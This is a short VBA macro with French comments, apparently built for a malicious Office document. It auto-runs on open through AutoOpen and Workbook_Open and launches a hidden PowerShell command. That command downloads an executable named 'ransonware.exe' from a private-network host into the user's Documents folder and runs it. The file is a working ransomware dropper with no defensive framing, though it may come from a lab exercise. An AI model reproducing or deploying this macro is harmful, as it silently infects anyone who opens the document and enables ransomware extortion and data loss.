Sub macro_powershell()

    'Crée un Shell appelant des commandes powershell
    Dim powershellCommands
    powershellCommands = Shell("powershell ""wget 'http://192.168.119.130/ransonware.exe' -outfile 'C:\Users\UserName\Documents\ransonware.exe' ; C:\Users\UserName\Documents\.\ransonware.exe """, 0)

End Sub


'Ajoute la compatibilité PowerPoint et Excel,
'En utilisant les fonctions AutoOpen() et Workbook_Open()

Sub AutoOpen()
    macro_powershell
End Sub

Sub Workbook_Open()
    macro_powershell
End Sub
